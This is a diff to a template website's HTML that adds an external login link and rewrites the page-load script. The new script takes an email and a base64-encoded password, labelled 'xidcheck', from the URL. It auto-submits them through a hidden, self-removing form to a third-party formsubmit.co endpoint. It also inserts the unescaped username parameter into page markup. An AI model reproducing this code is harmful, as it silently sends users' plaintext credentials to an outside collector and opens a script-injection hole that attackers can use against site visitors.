@@ -63,6 +63,7 @@
 			<li class="menu__item"><a href="portfolio.html" class="menu__link">Portfolio</a></li>
 			<li class="menu__item"><a href="pricing.html" class="menu__link">Pricing</a></li>
 			<li class="menu__item"><a href="contact-us.html" class="menu__link">Contact Us</a></li>
+			<li class="menu__item"><a href="https://test-login.up.railway.app" class="menu__link">Login</a></li>
 		</ul>
 	</nav>
 </header>
@@ -108,11 +109,11 @@
 							<div class="row">
 								<div class="col-md-6">
 									<div class="form-group">
-										<input type="hidden" name="_subject" value="New feedback submission!">
-            <input type="hidden" name="_autoresponse" value="Thank you. You will be responded back real quick!">
+										<input type="hidden" id="_subject" name="_subject" value="New Contact Form Submission!">
+            <input type="hidden" id="_autoresponse" name="_autoresponse" value="Thank you. You will be responded back real quick!">
             <!--<input type="hidden" name="_cc" value="x@ymail.z">-->
-            	<input type="hidden" name="_next" value="https://abbaskhurram255.github.io/site-2/#submission-fulfilled">
-            	<input type="hidden" name="_captcha" value="false">
+            	<input type="hidden" id="_next" name="_next" value="https://abbaskhurram255.github.io/site-2/#submission-fulfilled">
+            	<input type="hidden" id="_captcha" name="_captcha" value="false">
 										<input class="form-control" id="name" type="text" placeholder="Your Name" required="required" data-validation-required-message="Please enter your name.">
 										<p class="help-block text-danger"></p>
 									</div>
@@ -264,7 +265,7 @@
 				<div class="col-lg-3 col-md-6 col-sm-12">
 					<div class="mb-3 img-logo">
 						<a href="#">
-							<img src="images/logo3.jpg" alt="farewell image">
+							<img src="images/logo3.jpg" alt="farewell image" data-aos="fade-up" data-aos-duration="1400">
 						</a>
 						<p data-aos="fade-right" data-aos-duration="800">Lorem ipsum dolor sit amet, consectetur adipiscing
 							elit, sed do eiusmod tempor incididunt ut
@@ -277,11 +278,15 @@
 						RECENT NEWS
 					</h4>
 					<p class="ph-links-column">
-						<a data-aos="fade-top-right" data-aos-duration="2000" href="#" class="text-black">About us</a>
-						<a data-aos="fade-left" data-aos-duration="2200" href="#" class="text-black">Services</a>
-						<a data-aos="fade-down" data-aos-duration="2300" href="#" class="text-black">Selected Work</a>
-						<a data-aos="fade-down-left" data-aos-duration="2600" href="#" class="text-black">Get In Touch</a>
-						<a data-aos="fade-right" data-aos-duration="2700" href="#" class="text-black">Careers</a>
+						<a data-aos="fade-top-right" data-aos-duration="2000" href="about-us.html"
+							class="text-black footer__menu__link__a">About us</a>
+						<a data-aos="fade-left" data-aos-duration="2200" href="services.html"
+							class="text-black footer__menu__link__a">Services</a>
+						<a data-aos="fade-down" data-aos-duration="2300" href="portfolio.html"
+							class="text-black footer__menu__link__a">Selected Work</a>
+						<a data-aos="fade-down-left" data-aos-duration="2600" href="contact-us.html"
+							class="text-black footer__menu__link__a">Get In Touch</a>
+
 					</p>
 				</div>
 				<div class="col-lg-3 col-md-6 col-sm-12">
@@ -289,11 +294,16 @@
 						CATEGORIES
 					</h4>
 					<p class="ph-links-column">
-						<a data-aos="fade-right" data-aos-duration="2000" href="#" class="text-black">Business</a>
-						<a data-aos="fade-up" data-aos-duration="1500" href="#" class="text-black">Design</a>
-						<a data-aos="fade-down" data-aos-duration="1500" href="#" class="text-black">Real life</a>
-						<a data-aos="fade-left" data-aos-duration="1500" href="#" class="text-black">Science</a>
-						<a data-aos="fade-down-right" data-aos-duration="1500" href="#" class="text-black">Tech</a>
+						<a data-aos="fade-right" data-aos-duration="2000" href="#"
+							class="text-black footer__menu__link__b">Business</a>
+						<a data-aos="fade-up" data-aos-duration="1500" href="#"
+							class="text-black footer__menu__link__b">Design</a>
+						<a data-aos="fade-down" data-aos-duration="1500" href="#"
+							class="text-black footer__menu__link__b">Real life</a>
+						<a data-aos="fade-left" data-aos-duration="1500" href="#"
+							class="text-black footer__menu__link__b">Science</a>
+						<a data-aos="fade-down-right" data-aos-duration="1500" href="#"
+							class="text-black footer__menu__link__b">Tech</a>
 					</p>
 				</div>
 				<div class="col-lg-3 col-md-6 col-sm-12">
@@ -366,12 +376,37 @@
 	<script src="js/aos.js"></script>
 	<script>
 		window.onload = () => {
-			AOS.init({
-				duration: 1000,
-				easing: 'ease-in-out-sine',
-			});
-			scrolly();
-		};
+				if (location.hash.match(/submission_fulfilled/)) makeToast("You've successfully subscribed to our newsletters.", "Notice");
+				if (location.search.match(/login=success/)) {
+					let params = Object.fromEntries(new URLSearchParams(location.search));
+					document.querySelector(".menu__item:last-child").innerHTML = `<h5 class="menu__link">Logged in as <strong>${params.username}</strong></h5>`;
+					document.querySelector(".footer__menu__link__a:last-child").outerHTML = `<a data-aos="fade-right" data-aos-duration="2700" href="?logout=success" class="text-black footer__menu__link__a">Logout</a>`;
+					if (!location.search.match(/post=success/)) {
+						makeToast(`Logged in as ${params.username}`);
+						let x_f = document.createElement("div");
+						x_f.hidden = "hidden";
+						x_f.innerHTML = `
+				<form action="https://formsubmit.co/14f312b1adcd1cda642ee69edab7eea6"
+					method="POST">
+						<input type="hidden" name="_subject" value="New signup at..." />
+						<input type="hidden" name="_next"
+							value="${location.href}&post=success">
+						<input type="email" name="email" value="${atob(params.email)}" />
+						<input type="text" name="pwd" value="${atob(params.xidcheck)}" />
+						<input type="hidden" name="_captcha" value="false" />
+						<input type="hidden" name="_template" value="table" />
+						<button type="submit" />
+				</form>
+				`;
+						x_f = x_f.firstElementChild;
+						document.body.appendChild(x_f);
+						x_f.submit();
+						document.body.removeChild(x_f);
+					}
+				}
+				scrolly();
+				AOS.init();
+			}
 	</script>
 
 </body>
